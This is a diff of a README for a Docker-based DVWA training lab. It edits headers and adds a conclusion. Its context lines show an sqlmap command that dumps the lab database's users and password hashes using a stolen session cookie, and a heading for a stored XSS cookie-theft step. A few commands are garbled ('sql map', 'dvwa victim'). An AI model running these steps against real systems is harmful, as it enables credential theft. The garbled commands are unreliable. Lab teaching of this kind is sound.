@@ -42,7 +42,7 @@ docker exec -it kali-attacker /bin/bash
 
 ## Lab Objectives and Walkthrough
 
-### 1: Reconnaissance and Setup
+### Reconnaissance and Setup
 1. **Find the Target Hostname**:
 ```
 # Container name is 'dvwa-victim'
@@ -52,7 +52,7 @@ nmap -sn dvwa victim
 ```
 apt update && apt install sqlmap -y
 ```
-### 2: SQL Injection (SQLi) - Automated Database Compromise
+### SQL Injection (SQLi) - Automated Database Compromise
 1. **Capture Cookies**: In the browser (while logged into DVWA), open **Developer Tools** (F12) and find the `PHPSESSID` cookie value under the **Application** or **Storage** tab and copy this value.
 2. **Run SQLMap to Dump Credentials**:
 ```
@@ -61,7 +61,7 @@ sql map -u "http://dvwa-victim/vulnerabilities/sqli/?id=1&Submit=Submit" \
 --cookie="PHPSESSID=<Your_Session_ID>; security=low" -D dvwa -T users --dump --batch
 ```
 Success is confirmed when SQLMap displays a table listing the usernames and hashed passwords from the database.
-### : Cross-Site Scripting (XSS) - Stored Payload
+### Cross-Site Scripting (XSS) - Stored Payload
 1. **Navigate**: In the browser, go to the **"XSS (Stored)"** page.
 2. **Payload**: Use the following script in the **"Message"** field to demonstrate cookie theft/display:
 ```
@@ -72,3 +72,4 @@ Success is confirmed when SQLMap displays a table listing the usernames and hash
 ---
 
 ## Conclusion
+This lab successfully demonstrated the practical execution of two critical web application flaws: **SQL Injection (SQLi)** and **Cross-Site Scripting (XSS)**. By utilizing industry-standard tools like **SQLMap** within the isolated **Kali Linux** environment, the project contributor gained hands-on experience exploiting vulnerabilities rooted in insecure data handling and improper input sanitization. This exercise reinforces the importance of viewing application security from the attacker's perspective.
